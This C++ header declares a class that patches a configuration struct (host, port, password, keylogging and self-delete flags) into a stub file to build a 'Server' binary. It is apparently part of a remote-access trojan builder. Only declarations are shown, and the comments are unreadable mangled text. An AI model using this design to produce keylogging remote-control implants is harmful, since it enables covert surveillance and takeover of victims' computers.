// BulidServer.h: interface for the CBulidServer class.
//
//////////////////////////////////////////////////////////////////////
// By:www.heicode.net
// Date:2015-06-30

#if !defined(AFX_BULIDSERVER_H__2C3F832E_E520_4211_B829_90C35C7C6D03__INCLUDED_)
#define AFX_BULIDSERVER_H__2C3F832E_E520_4211_B829_90C35C7C6D03__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#define __ERROR_CODE_SUCCESS				1	// �����ɹ�
#define __ERROR_CODE_OPEN_DAT_FILE_FAILED	2	// ��Dat�ļ�ʧ��
#define __ERROR_CODE_CREATE_SERVER_FAILED	3	// ����Serverʧ��

// struct Server_Data 
// {
// 	char szFindFlags[20];
//     char szHost[128];//��ַ
// 	char szPort[64];//�˿�
//     char szPass[64];//����
//     char szGroup[64];//����
//     char szVer[64];//�汾
// 	char szID[128];//�����ʶ
// 	UINT uDelayTime;//���ӳ�ʱ
// 	bool szIsDel;//��ɾ��
//     bool IsKeyMon;//�Ƿ����ü���
// 	bool Run;///������
// };

class CBulidServer  
{
public:
	CBulidServer();
	virtual ~CBulidServer();

public:
	// �����ͻ�
	// pStructPointer �ṹ��ָ��
	// iStructPointerSize �ṹ���С
	// strDatFilePath Dat�ļ�·��
	// strBulidSavePath ����·��
	// �ɹ�����TRUE,����ʧ��,�������ô�����Ϣ
	BOOL BulidServer(PVOID pStructPointer, INT iStructPointerSize, PCTSTR strDatFilePath, PCTSTR strBulidSavePath);

	// ��ȡ������������Ϣ
	// ���ؾ��������Ϣ�ַ���
	PCTSTR GetErrorCodeInfo(void);

private:
	// �������
	DWORD m_dwErrorCode;

private:
	// ���ô������
	// dwErrorCode �������
	void SetErrorCode(DWORD dwErrorCode);

	// �ж�Dat�ļ��Ƿ����
	// strDatPath Dat�ļ�·��
	// �ɹ�����TRUE,����ʧ��,�������ô�����Ϣ
	BOOL IsDatFile(PCTSTR strDatPath);

	// ��ȡDat���ݵ�Buffer
	// strDatPath Dat�ļ�·��
	// pBuffer ���,Bufferָ��
	// dwBufferSize ���,Buffer���ݴ�С
	// �ɹ�����TRUE,����ʧ��,�������ô�����Ϣ
	BOOL ReadDatDataToBuffer(PCTSTR strDatPath, PCHAR &pBuffer, DWORD &dwBufferSize);

	// ����Server
	// pStructPointer �ṹ��ָ��
	// iStructPointerSize �ṹ���С
	// strBulidSavePath ����·��
	// pDatBuffer Dat�ļ�����Buffer
	// dwDatBufferSize Dat�ļ����ݴ�С
	// �ɹ�����TRUE,����ʧ��,�������ô�����Ϣ
	BOOL CreateServer(PVOID pStructPointer, INT iStructPointerSize, PCTSTR strBulidSavePath, PCHAR &pDatBuffer, DWORD &dwDatBufferSize);

	// ���ҽṹ������λ��ƫ��(��Dat�ļ��е�λ��ƫ��)
	// pStructPointer �ṹ��ָ��
	// iStructPointerSize �ṹ���С
	// pDatBuffer Dat�ļ�����Buffer
	// dwDatBufferSize Dat�ļ����ݴ�С
	// �ɹ����ط�0,����ʧ��,�������ô�����Ϣ
	UINT FindStructDataOffset(PVOID pStructPointer, INT iStructPointerSize, PCHAR &pDatBuffer, DWORD &dwDatBufferSize);
};

#endif // !defined(AFX_BULIDSERVER_H__2C3F832E_E520_4211_B829_90C35C7C6D03__INCLUDED_)
